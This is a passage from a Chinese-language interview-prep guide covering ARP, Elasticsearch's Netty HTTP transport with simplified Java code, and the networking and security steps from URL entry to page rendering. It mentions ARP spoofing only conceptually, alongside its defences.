# 如果目标 IP 不在同一网段，ARP 解析的是网关的 MAC
# 然后由网关（路由器）继续转发

# 清除 ARP 缓存
arp -d 192.168.1.100
```

**⚠️ 常见坑/加分回答：**
- **ARP 欺骗攻击**：攻击者发送伪造的 ARP 响应，将自己的 MAC 映射为目标 IP。受害者的数据会先发给攻击者（中间人攻击）
- 防御 ARP 欺骗：静态 ARP 绑定（手动绑定 IP-MAC），或使用动态 ARP 检测（DAI）
- 面试加分：IPv6 用 NDP（Neighbor Discovery Protocol）替代了 ARP，且 NDP 有安全扩展（SEND）防止欺骗

### 第29集：Elasticsearch 的底层网络通信原理？（Netty 应用）

**💡 核心回答：**

Elasticsearch 的节点间通信和 HTTP API 都是基于 Netty 构建的。这是 Netty 在生产级应用中的经典案例。

**两个网络层：**
1. **Transport 层**：节点间通信（集群内部），默认端口 9300
2. **HTTP 层**：对外 REST API，默认端口 9200

两者都使用 Netty 的 NIO 实现。

**📦 实际例子：**

```java
// Elasticsearch 的 Netty 配置（简化版，源码在 Netty4HttpServerTransport）
public class Netty4HttpServerTransport extends AbstractHttpServerTransport {

    @Override
    protected void doStart() {
        // Boss EventLoopGroup：处理连接接收
        bossGroup = new NioEventLoopGroup(
            httpServerTransportSettings.getDefaultBossThreads(),  // 通常 1
            esThreadFactory("http_server_boss")
        );
        // Worker EventLoopGroup：处理 I/O 读写
        workerGroup = new NioEventLoopGroup(
            httpServerTransportSettings.getDefaultWorkerThreads(), // 通常 CPU核数 * 2
            esThreadFactory("http_server_worker")
        );

        // 绑定端口
        ServerBootstrap bootstrap = new ServerBootstrap()
            .group(bossGroup, workerGroup)
            .channel(NioServerSocketChannel.class)
            .childHandler(new ChannelInitializer<Channel>() {
                @Override
                protected void initChannel(Channel ch) {
                    ChannelPipeline pipeline = ch.pipeline();
                    pipeline.addLast("codec", new HttpRequestDecoder());    // HTTP 请求解码
                    pipeline.addLast("aggregator", new HttpObjectAggregator(
                        httpServerTransportSettings.getMaxContentLength()));
                    pipeline.addLast("encoder", new HttpResponseEncoder()); // HTTP 响应编码
                    pipeline.addLast("handler", new Netty4HttpServerHandler(
                        Netty4HttpServerTransport.this));                   // 业务处理
                }
            });

        bootstrap.bind(httpServerTransportSettings.getPort());
    }
}
```

**Pipeline 中的请求处理流程：**

```
HTTP 请求到达 → HttpRequestDecoder（解码为 HttpObject）
  → HttpObjectAggregator（聚合为 FullHttpRequest）
    → Netty4HttpServerHandler（路由到对应的 REST Action）
      → TransportAction（执行搜索/索引等操作）
        → HttpResponseEncoder（编码为 HTTP 响应）
          → 返回给客户端
```

**⚠️ 常见坑/加分回答：**
- Elasticsearch 7.x 开始内置 JDK（bundled JDK），默认使用 `nio` 或 `epoll`（Linux）NIO 实现
- Netty 在 ES 中的连接管理：节点间使用长连接 + 连接池，请求通过 Stream 多路复用
- 面试加分：Kafka、Dubbo、RocketMQ 的底层网络通信也都使用了 Netty

### 第30集：综合题：从浏览器输入 URL 到页面渲染，完整链路中涉及了哪些网络和安全知识？

**💡 核心回答：**

这是一道综合题，把前面所有知识点串起来：

```
用户输入 https://pay.example.com/checkout

1. DNS 解析
   ├─ 浏览器缓存 → 系统缓存 → LocalDNS → 根DNS → 顶级域DNS → 权威DNS
   └─ 得到 pay.example.com 的 IP：203.0.113.50

2. TCP 连接
   ├─ 三次握手（SYN → SYN+ACK → ACK）
   └─ 如果是 HTTP/2，只需建立一个 TCP 连接

3. TLS 握手
   ├─ ClientHello：支持的 TLS 版本、加密套件、ClientRandom
   ├─ ServerHello：选定的加密套件、ServerRandom
   ├─ Certificate：服务端证书链
   ├─ 客户端验证证书链（根CA → 中间CA → 终端证书，检查域名、有效期）
   ├─ ClientKeyExchange：密钥交换（TLS 1.2: RSA/ECDHE; TLS 1.3: ECDHE only）
   ├─ 双方计算会话密钥（对称密钥）
   └─ ChangeCipherSpec + Finished：切换到加密模式

4. HTTP 请求
   ├─ 浏览器构造 HTTP GET 请求
   ├─ 携带 Cookie（JSESSIONID / 登录 Token）
   └─ 使用会话密钥加密后发送

5. CDN 处理（如果 pay.example.com 配置了 CDN）
   ├─ CDN 边缘节点检查缓存
   ├─ 命中 → 直接返回静态资源（JS/CSS/图片）
   └─ 未命中 → 回源获取，缓存后返回

6. 服务端处理
   ├─ 负载均衡器将请求分发到后端服务器
   ├─ 应用服务器处理业务逻辑
   ├─ 查询数据库（如订单信息）
   └─ 返回 HTML/JSON 响应

7. 页面渲染
   ├─ 浏览器解析 HTML，发现需要加载 JS/CSS/图片
   ├─ 对静态资源发起并行请求（HTTP/2 多路复用）
   ├─ 每个资源可能经过 CDN 缓存
   └─ DNS 预解析优化：浏览器自动预解析页面中的域名

8. 安全层面（贯穿全程）
   ├─ HTTPS：传输加密（AES-GCM 对称加密 + ECDHE 密钥交换）
   ├─ CORS：跨域资源请求检查 Access-Control-Allow-Origin
   ├─ CSP（Content-Security-Policy）：防止 XSS
   ├─ HSTS：强制使用 HTTPS
   └─ Cookie 安全：HttpOnly + Secure + SameSite
```

**🔍 源码解析：**

Java 中可以通过代码模拟和观察这个过程的各个阶段：

```java
// 1. DNS 解析
InetAddress address = InetAddress.getByName("pay.example.com");
System.out.println("IP: " + address.getHostAddress());

// 2-3. TCP + TLS（底层自动完成）
SSLSocket socket = (SSLSocket) SSLSocketFactory.getDefault()
    .createSocket("pay.example.com", 443);
socket.addHandshakeCompletedListener(event -> {
    System.out.println("协议: " + event.getSession().getProtocol());      // TLSv1.3
    System.out.println("套件: " + event.getSession().getCipherSuite());   // TLS_AES_256_GCM_SHA384
});
socket.startHandshake();

// 4. HTTP 请求
OutputStream out = socket.getOutputStream();
out.write("GET /checkout HTTP/1.1\r\n".getBytes());
out.write("Host: pay.example.com\r\n".getBytes());
out.write("Connection: close\r\n\r\n".getBytes());

// 读取响应
BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
String line;
while ((line = in.readLine()) != null) {
    System.out.println(line);
}
```

**⚠️ 常见坑/加分回答：**
- 面试中这道题可以展示知识体系的完整性，建议按"网络层 → 传输层 → 应用层 → 安全层 → 性能优化"的顺序组织回答
- 每个环节都可以深挖，但面试时不需要全部展开，选择自己最熟悉的 2-3 个点深入讲
- 性能优化手段：DNS 预解析、TCP Fast Open、TLS 1.3（0-RTT）、HTTP/2 多路复用、CDN 缓存
- 面试加分：可以提到 HTTP/3 (QUIC) 如何进一步优化：0-RTT 连接建立 + 无 TCP 队头阻塞 + 连接迁移（手机从 WiFi 切到 4G 不断连）
